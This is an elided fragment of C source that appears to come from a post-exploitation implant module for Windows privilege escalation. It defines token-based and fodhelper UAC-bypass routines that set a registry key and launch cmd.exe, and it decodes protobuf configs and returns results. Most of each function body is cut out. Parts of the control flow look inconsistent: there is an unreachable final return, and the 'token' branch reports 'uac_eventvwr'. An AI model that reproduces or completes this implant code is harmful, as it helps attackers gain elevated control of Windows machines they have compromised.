...
static int privesc_token(const ark_privesc_config *cfg, uint32_t *new_pid) {
...
static int privesc_fodhelper(const ark_privesc_config *cfg, uint32_t *new_pid) {
    const char *cmd = cfg->command[0] ? cfg->command : "C:\\Windows\\System32\\cmd.exe";
    HKEY hkey = NULL;
    ...
    int32_t code = 1;
    int ok = ark_mod_run_cmd(run, &so, &se, &code);
    free(so); free(se);
...
int ark_mod_privesc(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len) {
    ark_privesc_config cfg;
    if (!ark_pb_decode_privesc_config(config, config_len, &cfg)) return 0;
    ...
    if (strcmp(cfg.method, "token") == 0) {
        ...
        return ark_pb_encode_privesc_result(0, "uac_eventvwr", "unsupported", 0, out, out_len);
    } else {
        return ark_pb_encode_privesc_result(0, cfg.method, "unsupported", 0, out, out_len);
    }

    return ark_pb_encode_privesc_result(success, cfg.method, integrity, new_pid, out, out_len);
}